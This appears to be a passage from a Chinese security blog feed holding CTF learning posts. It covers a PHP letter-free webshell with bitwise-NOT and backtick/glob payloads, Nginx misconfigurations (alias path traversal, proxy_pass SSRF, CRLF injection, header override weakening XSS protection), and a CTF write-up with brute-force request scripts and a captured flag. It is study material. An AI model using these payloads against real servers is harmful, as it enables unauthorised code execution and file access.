轻松解决</h2><p>在PHP7下，我们可以轻松通过取反操作实现<code>webshell</code>。这是因为PHP7前不允许<code>($a)();</code>，<code>PHP7</code>修改了表达式执行的顺序，具体逻辑如下图：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af.png" alt="30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af"></p><blockquote><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p></blockquote><p>综上所述，我们可以构造<code>($a)();</code>，其中把<code>$a</code>设置成<code>phpinfo</code>，完整的<code>payload</code>如下：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~<span class="variable">%8</span>F<span class="variable">%97</span><span class="variable">%8</span>F<span class="variable">%96</span><span class="variable">%91</span><span class="variable">%99</span><span class="variable">%90</span>)()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>根据<code>PHP7</code>的表达式执行逻辑，先取反，再执行<code>phpinfo()</code>。效果如下：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805221000735.png" alt="image-20240805221000735"></p><p><code>PHP7</code>下我们轻松解决了该问题</p><h2 id="PHP5-·-与glob"><a href="#PHP5-·-与glob" class="headerlink" title="PHP5 · .与glob"></a>PHP5 · <code>.</code>与<code>glob</code></h2><p>如果采用上面<code>PHP7</code>的方法，在<code>PHP5</code>中会报错：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240806095757387.png" alt="image-20240806095757387"></p><p>具体原因上面有谈到过，这里就不赘叙了，主要谈谈<code>PHP5</code>中该怎么解决题目。</p><p>这里P神的思考非常经典，我引用一段：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240806100152952.png" alt="image-20240806100152952"></p><p>以及P神的经验：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240806100246885.png" alt="image-20240806100246885"></p><p>这些都是学好安全的必备品质，这里不赘叙，言归正传。</p><p>使用反引号执行系统命令，不仅成功避免了使用字母和数字，还节约了很多字符。我们现在可以执行系统命令了，但是要怎么查看文件呢？</p><p>查看文件的指令由两部分组成：命令和文件路径。这两方面我们都得考虑，对此P神给出了两个提示：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240806101246359.png" alt="image-20240806101246359"></p><p>命令可以使用<code>.</code>，文件名使用<code>glob</code>通配符来过滤，如下示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /???/??????</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240806101836009.png" alt="image-20240806101836009"></p><p>我一开始想的是<code>/etc/passwd</code>，但是很明显有文件先匹配然后执行了，这说明上面指令有很多符合条件的文件，如下（还有很多文件）：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240806102046734.png" alt="image-20240806102046734"></p><p>如此我们便无法读取到目标文件，必须对路径进行过滤。有两个方法可以帮助我们：</p><ul><li><code>[^x]</code>表示“这个位置不是<code>x</code>”，利用这一点可以过滤许多文件，但是要求这些文件路径有符号或者特殊字符，<code>^</code>可以用<code>!</code>代替</li><li><code>glob</code>支持利用<code>[0-9]</code>来表示一个范围。比如<code>[@-[]</code>包含<code>ASCII</code>码在<code>@</code>和<code>[</code>间（包括<code>@</code>和<code>[</code>）的字符，我们可以成功过滤掉该位置是小写字符的文件。</li></ul><p>但是对于本人在云服务器上的文件（如上图）并不能很好地契合实验效果，就不再展示了，推荐读者阅读P神的文章。</p><p>在文件路径适宜的情况下，通过以上的过滤可以实现读取文件，P神<code>payload</code>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;</span><br></pre></td></tr></table></figure><p>结果也用P神的：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/56de7887-0a22-4b06-9ccd-2951a4bdab4c.624e7ada5f87.png" alt="56de7887-0a22-4b06-9ccd-2951a4bdab4c.624e7ada5f87"></p><p>至此第二种方法成功。</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>学习P神的文章受益匪浅！P神看待问题从本质出发、思路广泛、研究细致、善读文档，值得吾辈学习。</p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx配置不当</title>
      <link href="/2024/08/03/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93/"/>
      <url>/2024/08/03/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这段时间做了好几道<code>Nginx</code>配置不当的题目，集中学习一下这方面的知识。</p><h1 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h1><p><code>Nginx</code>的主配置文件为<code>nginx.conf</code>，在任何情况下<code>Nginx</code>都会加载该文件。<code>nginx.conf</code>文件结构分明，由多个模块构成，如下：</p><p><img src="/./../images/posts/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93/20190418163927-79fddd08-61b5-1.png" alt="20190418163927-79fddd08-61b5-1"></p><p>用代码表示如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...              <span class="comment">#全局块     --&gt;main</span></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;         <span class="comment">#events块</span></span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">http</span>      <span class="comment">#http块</span></span><br><span class="line">&#123;</span><br><span class="line">    ...   <span class="comment">#http全局块</span></span><br><span class="line">    <span class="attribute">server</span>        <span class="comment">#server块</span></span><br><span class="line">    &#123; </span><br><span class="line">        ...       <span class="comment">#server全局块</span></span><br><span class="line">        <span class="section">location</span> [PATTERN]   <span class="comment">#location块</span></span><br><span class="line">        &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="section">location</span> [PATTERN]   <span class="comment">#另一个location块</span></span><br><span class="line">        &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解析</strong></p><p><code>Nginx</code><strong>层级分明</strong>，每个层级都有自己的指令。子块会继承父块的配置，如果二者配置的指令不同，则子块会覆盖父块的配置。指令格式如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">指令名 参数<span class="number">1</span> 参数<span class="number">2</span> 参数<span class="number">3</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><p>在<code>nginx.conf</code>还可以引入其他的配置文件，如<code>include /etc/nginx/mime.types;</code>就包含了各种支持的Content-type。另外，开发者不可能把服务都写在<code>nginx.conf</code>里，对应的<code>.conf</code>文件也会被包含。</p><p>一个<strong>server</strong>块表示一个host，可以在<code>server</code>块中添加或者更改<code>nginx</code>服务监听的端口、存放网页文件的位置、以及虚拟主机配置（开反向代理）。<br>一个<strong>location</strong>块代表一个路由映射规则。</p><h1 id="0x02-alias配置不当-·-目录穿越"><a href="#0x02-alias配置不当-·-目录穿越" class="headerlink" title="0x02 alias配置不当 · 目录穿越"></a>0x02 <strong>alias</strong>配置不当 · 目录穿越</h1><h2 id="条件其一"><a href="#条件其一" class="headerlink" title="条件其一"></a>条件其一</h2><p>在<code>nginx.conf</code>文件的<strong>server</strong>块中加入：<code>autoindex on;</code>，可以添加目录浏览功能，但是也会产生安全问题，如本节的<code>alias</code>配置不当引起的一系列漏洞。具体配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">           <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>在该代码块的基础上会导致目录遍历，可以访问设置的根目录下的文件。</p><h2 id="条件其二"><a href="#条件其二" class="headerlink" title="条件其二"></a>条件其二</h2><blockquote><p>在nginx做<strong>反向代理</strong>的时候，我们通常会把<em>动态</em>部分传递给后方解析的服务器，由nginx来处理<em>静态</em>文件<br>当使用<strong>alias</strong>来对文件路径进行配置时，有可能会造成目录穿越漏洞</p></blockquote><p><strong>正常配置</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /files/ &#123;</span><br><span class="line">            <span class="attribute">alias</span>     /etc/nginx/txtpath/;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>正常访问<code>http://your_ip/files/pax.txt</code>，便会读取<code>/etc/nginx/txtpath/pax.txt</code>文件。</p><p><strong>配置不当</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ocation</span> /files &#123;</span><br><span class="line">            <span class="attribute">alias</span>     /etc/nginx/txtpath/;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p><strong>&#x2F;files&#x2F;<strong>变成了</strong>&#x2F;files</strong>，第二个斜杠没有了，那么攻击者就可以读取正常文件夹之外的文件。</p><p>当访问<code>http://your_ip/files../pax.txt</code>，便会读取<code>/etc/nginx/pax.txt</code>文件。</p><h2 id="同时满足"><a href="#同时满足" class="headerlink" title="同时满足"></a>同时满足</h2><p>条件一允许我们读取该目录下的所有目录及文件；条件二允许我们返回到上级目录。若同时满足这两个条件，我们便可以读取该目录的上级目录下的所有目录和文件。</p><p>当<code>alias</code>指定的目录足够上层（到根目录的下级目录），我们就可以穿梭到根目录。</p><p><img src="/./../images/posts/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93/20190418164249-f26df0de-61b5-1.png" alt="20190418164249-f26df0de-61b5-1"></p><p>对应题目：<strong>CTFHub-&gt;历年真题-&gt;web-&gt;afr-2</strong></p><h1 id="0x03-反代配置不当-·-SSRF"><a href="#0x03-反代配置不当-·-SSRF" class="headerlink" title="0x03 反代配置不当 · SSRF"></a>0x03 反代配置不当 · SSRF</h1><blockquote><p>Nginx经常拿来做<strong>反向代理服务器</strong>。反向代理服务器其实就是一台负责转发的代理服务器，实现了转发的作用，然后从真正的服务器获取数据并转发给客户端。</p></blockquote><p><strong>正常配置</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">         <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">         <span class="attribute">server_name</span> <span class="number">192.168.1.2:8080</span>;    </span><br><span class="line"></span><br><span class="line">         <span class="section">location</span> / &#123;   </span><br><span class="line">                    <span class="attribute">proxy_pass</span> http://192.168.1.2:8080；  </span><br><span class="line">                    &#125;  </span><br><span class="line">             <span class="comment">#......</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p><strong>配置不当</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /([a-zA-Z0-<span class="number">9</span>.:%]+) &#123;   </span><br><span class="line">                    <span class="attribute">proxy_pass</span> http://<span class="variable">$1</span>；  </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><p><strong>$1</strong>：正则匹配的第一个括号的内容。</p><p>如果访问的<code>url</code>是服务端的内网，因为<code>$1</code>等于<code>url</code>，所以<code>Nginx</code>会代理到服务端的内网，实现<code>SSRF</code>。</p><p><strong>防御思路</strong></p><ul><li><strong>输入验证</strong>：确保只允许合法的外部地址。</li><li><strong>白名单</strong>：限制可访问的 <code>IP</code> 地址。</li><li><strong>监控日志</strong>：及时发现异常请求。</li></ul><h1 id="0x04-重定向配置不当-·-CRLF"><a href="#0x04-重定向配置不当-·-CRLF" class="headerlink" title="0x04 重定向配置不当 · CRLF"></a>0x04 重定向配置不当 · CRLF</h1><blockquote><p>当一个网站使用https协议的时候，很多站点会强制用户使用<em>https</em>进行访问。当用户访问<em>http</em>的时候会<code>302</code>跳转到https页面。</p></blockquote><p>配置不当：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /<span class="number">302</span> &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">302</span> https://<span class="variable">$host</span><span class="variable">$uri</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p><code>Nginx</code>中 ，<code>$uri</code>指的是请求的文件和路径，不包含后面请求的数据（即?和#后面的数据），<code>Nginx</code>服务器会对<code>$uri</code>进行解码。当<code>$uri</code>后面添加<code>%0d%0a</code>，便可以污染<code>HTTP</code>头的数据。</p><p>比如，访问<code>http://your_ip/302/pax.php</code>会<strong>302</strong>跳转到<code>https://your_ip/302/pax.php</code>，这是正常的302跳转。但是如果访问<code>http://your_ip/302/pax.php%0d%0a%0d%0aman=1</code>，<strong>302</strong>跳转会指向<code>https://your_ip/302/pax.php</code>并且<strong>POST</strong>一个参数 <code>man=1</code>，比如下图例子：</p><p><img src="/./../images/posts/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93/20190418164304-fb29d2c4-61b5-1.png" alt="20190418164304-fb29d2c4-61b5-1"></p><p>如此便达成了<code>CRLF</code>。</p><h1 id="0x05-子块覆盖父块不当"><a href="#0x05-子块覆盖父块不当" class="headerlink" title="0x05 子块覆盖父块不当"></a>0x05 子块覆盖父块不当</h1><blockquote><p>在nginx配置文件中子块是可以继承父块的配置的。但是当我们在父块中设置了<code>add_header</code>头，然后再在子块中设置另一个add_header头时，子块会覆盖掉父块中的add_header头的设置。</p></blockquote><p>假如配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">add_header</span> X-Frame-Options DENY;</span><br><span class="line">    <span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> = /safe &#123;</span><br><span class="line">        <span class="attribute">return</span> /xss.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> = /dangerous &#123;</span><br><span class="line">        <span class="attribute">add_header</span> X-Content-Type-Options nosniff;</span><br><span class="line">        <span class="attribute">return</span> /xss.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>须知：</p><ul><li><code>add_header</code> 是 <code>Nginx</code> 配置指令，用于向 HTTP 响应中添加自定义 HTTP 头部。</li><li><code>X-Frame-Options DENY</code>和<code>Content-Security-Policy &quot;default-src &#39;self&#39;&quot;</code>用来抵御一般的<strong>XSS</strong>攻击。</li><li><code>X-Content-Type-Options</code> 是一个 HTTP 响应头，用于防止浏览器对内容类型进行嗅探。其常见的值是 <code>nosniff</code></li></ul><p>如果访问<code>http://your_ip/safe</code>，采用父块的<code>add_header</code>，不会触发<code>XSS</code>。</p><p>但是如果访问<code>http://your_ip/dangerous</code>，子块的<code>add_header</code>覆盖了父块的<code>add_header</code>，对<code>xss</code>的防御不再生效，成功触发<code>xss</code>。</p><h1 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h1><p><a href="https://xz.aliyun.com/t/4855">https://xz.aliyun.com/t/4855</a></p><p><a href="https://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/">Nginx错误配置alias导致目录遍历漏洞 | BlackWolf (blackwolfsec.cc)</a></p>]]></content>
      
      
      <categories>
          
          <category> 配置问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道ctfhub题引起的思考</title>
      <link href="/2024/08/03/%E4%B8%80%E9%81%93ctfhub%E9%A2%98%E5%BC%95%E8%B5%B7%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2024/08/03/%E4%B8%80%E9%81%93ctfhub%E9%A2%98%E5%BC%95%E8%B5%B7%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>大胆假设，小心求证。本篇文章会细致分析每个环节的逻辑，但是<code>CTF</code>有时不太需要逻辑，反而需要些灵感。所以，没有思路时，不妨胡乱比划一下。赛后，再好好分析灵感的逻辑。</p><h1 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h1><p>无源码，直接扫。存在<code>flag.php</code>，访问无果，<code>0B</code>的信息可见一斑，应该是障眼法。</p><p>看看题目：</p><p><img src="/./../images/posts/%E4%B8%80%E9%81%93ctfhub%E9%A2%98%E5%BC%95%E8%B5%B7%E7%9A%84%E6%80%9D%E8%80%83/image-20240803173149732.png" alt="image-20240803173149732"></p><p>存在<code>GET</code>参数<code>num</code>，是表单参数。</p><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><p>对题目的了解差不多了，我们只能从<strong>num</strong>入手。</p><p>我对两个方向思考：</p><ul><li>参数注入，也就是不玩游戏。</li><li>利用游戏bug，也就是玩游戏。</li></ul><h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><p>注入的原理无非就是：<strong>输入流从数据流侵略到控制流</strong>。</p><p>想知道怎么注入，最好要知道流程代码。本题没有源码可以看，只能猜。但是这绝非<code>SQL</code>注入等，代码异常灵活，很难猜。所以先不考虑参数注入。</p><h2 id="利用游戏bug"><a href="#利用游戏bug" class="headerlink" title="利用游戏bug"></a>利用游戏bug</h2><p>看来只能玩游戏了。先思考游戏逻辑：如果我输入的数字对上了，是不是就可以得到<code>flag</code>？不妨试一试。</p><p>众所周知，<code>CTFer</code>不会好好玩游戏。em，我刚开始真想好好玩。</p><h3 id="碰撞"><a href="#碰撞" class="headerlink" title="碰撞"></a>碰撞</h3><p><em>我认为这是好好玩游戏</em></p><p>我设想，服务器处理需要时间，如果我极快地发包，能不能竞争一下，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge-1919adb7a8424f20.sandbox.ctfhub.com:10800/index.php?num=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    r = requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    sleep(<span class="number">.00</span>)</span><br></pre></td></tr></table></figure><p>但是每次随机数都会变，采用多线程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge-6fda29f9e3d6c76d.sandbox.ctfhub.com:10800/index.php?num=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_random_number</span>(<span class="params">i</span>):</span><br><span class="line">    r = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">10</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    futures = [executor.submit(fetch_random_number, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)]</span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> futures:</span><br><span class="line">        <span class="built_in">print</span>(future.result())</span><br></pre></td></tr></table></figure><p>还是一样，为什么呢？以后想想。</p><h3 id="等于"><a href="#等于" class="headerlink" title="等于"></a>等于</h3><p>如果只能玩一次成功，那么核心在于<strong>等于</strong>二字。<code>num</code>等于随机数，才能完成游戏。</p><p>不妨先想想这段代码会是什么样子，进行比较的代码会不会用一些特殊的函数，比如<code>MD5</code>？那我得先看看<code>PHP</code>特性了。</p><h4 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h4><p>这是我的一个弯路。我在笔记里寻找类似的题目，但是始终没有符合的<code>PHP</code>特性。</p><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><h5 id="运气"><a href="#运气" class="headerlink" title="运气"></a>运气</h5><p>其实不需要把代码<strong>先</strong>想得那么复杂。当时我并没有思路，苦闷之际往输入框里输入一堆字符乱码，正好下一个随机数是0······flag出来了。</p><p>诚然，有运气成分，但是这点还是可以推理出来的。</p><h5 id="推理"><a href="#推理" class="headerlink" title="推理"></a>推理</h5><p>上面说过：</p><blockquote><p>其实不需要把代码<strong>先</strong>想得那么复杂。</p></blockquote><p>代码的逻辑也可以是简单的<strong>等于</strong>。</p><p>我们希望两个数的对比有一方是可控的，很明显随机数是不可控的，那么只能使<code>num</code>可控。要使<code>num</code>可控，不难联想到强制类型转换，不要因为这道题是数字对比就只会输入数字，<strong>CTFer不按常理出牌！</strong></p><p>以上的推理并不难，慢慢消化即可。</p><p>既然<code>num</code>可控，那么只要不断循环即可碰到0，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge-1919adb7a8424f20.sandbox.ctfhub.com:10800/index.php?num=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.get(url+<span class="string">&quot;manbaout&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfhub&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>成功得到<strong>flag</strong>：<code>ctfhub&#123;e4be0f277101db19c0512c4a&#125;</code></p><h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>整理一下逻辑树：</p><ul><li>游戏<ul><li>玩（利用bug）<ul><li><code>PHP</code>特性（无果）</li><li>类型转换（成功）</li></ul></li><li>不玩（注入）（无果）</li></ul></li></ul><p>还有一些很重要的经验：</p><ul><li><p>开局先试试几个文件，后台<code>dirsearch</code>直接扫</p></li><li><p>大胆猜代码，善于猜代码</p></li><li><p><code>CTFer</code>不走寻常路，不接受一些暗示</p></li><li><p>没思路时，不妨多胡乱试试</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析时间碰撞脚本</title>
      <link href="/2024/08/03/%E6%B5%85%E6%9E%90%E6%97%B6%E9%97%B4%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/"/>
      <url>/2024/08/03/%E6%B5%85%E6%9E%90%E6%97%B6%E9%97%B4%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>承接上篇博客，分析<strong>狗and猫</strong>大佬的时间碰撞脚本，冀以掌握精髓、用于比赛。</p><h1 id="0x01-脚本"><a href="#0x01-脚本" class="headerlink" title="0x01 脚本"></a>0x01 脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 